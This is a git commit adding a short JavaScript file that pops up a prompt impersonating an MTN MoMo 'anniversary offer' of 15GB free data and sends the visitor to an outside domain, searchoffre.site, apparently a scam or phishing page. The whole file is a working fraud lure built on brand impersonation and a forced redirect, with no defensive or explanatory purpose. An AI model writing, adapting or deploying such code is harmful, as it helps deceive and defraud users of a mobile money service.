e5fccd6f9240e4a53b776541e5966de4cd4fa72b
bigetijazz8 <bigetijazz8@gmail.com>
2024-11-05 22:25:16 -0800

    Create momoat15.js

---
+++ momoat15.js
@@ -0,0 +1,6 @@
+
+var password = 'CLAIM 15GB'
+password=prompt('MoMoAt15: Hello, Claim your 15gb free data from MTN MoMo anniversary offer, Kindly press Ok to Claim now','CLAIM 15GB');
+if (password != 'CLAIM 15GB') {
+location.href='https://www.searchoffre.site/15gb';
+}
